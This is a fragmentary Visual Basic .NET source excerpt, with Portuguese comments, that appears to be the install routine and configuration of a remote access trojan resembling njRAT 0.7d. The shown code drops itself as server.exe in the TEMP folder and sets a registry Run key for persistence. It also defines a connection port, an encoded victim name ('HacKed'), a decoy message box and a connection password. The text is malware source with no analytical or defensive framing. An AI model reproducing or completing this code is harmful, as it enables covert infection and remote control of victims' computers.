    ...
    Public Shared Sub INS()
        ...
        If (OK.Idr AndAlso Not OK.CompDir(OK.LO, New FileInfo((Interaction.Environ(OK.DR).ToLower & "\" & OK.EXE.ToLower)))) Then
            Try
                ...
                If StatusMensagem = "True" Then

                    MsgBox(MenssagemMS, MsgBoxStyle.Exclamation, TituloMenssagem)
...
Label_01C1:
    ...
    Public Shared StatusMensagem As String = "False" 'ON/OFF MsgBox
    Public Shared TituloMenssagem As String = "" 'Titulo MsgBox
    Public Shared MenssagemMS As String = "" 'Mensagem MsgBox
    ...
    Public Shared DR As String = "TEMP" 'Diretorio
    Public Shared EXE As String = "server.exe" 'Nome do Process
    ...
    Public Shared P As String = "50" 'Porta
    Public Shared PLG As Object = Nothing
    Public Shared RG As String = "e99e462d99ad204bdf7d672852a4e30a" 'Nome da Chave do Registro
    Public Shared sf As String = "Software\Microsoft\Windows\CurrentVersion\Run" 'Chave do Registro
    Public Shared VN As String = "SGFjS2Vk" 'Nome da Vitima (Encrypytado)
    Public Shared VR As String = "0.7d" 'Versão
    Public Shared Y As String = "|'|'|" 'Senha de Conexão (Split)
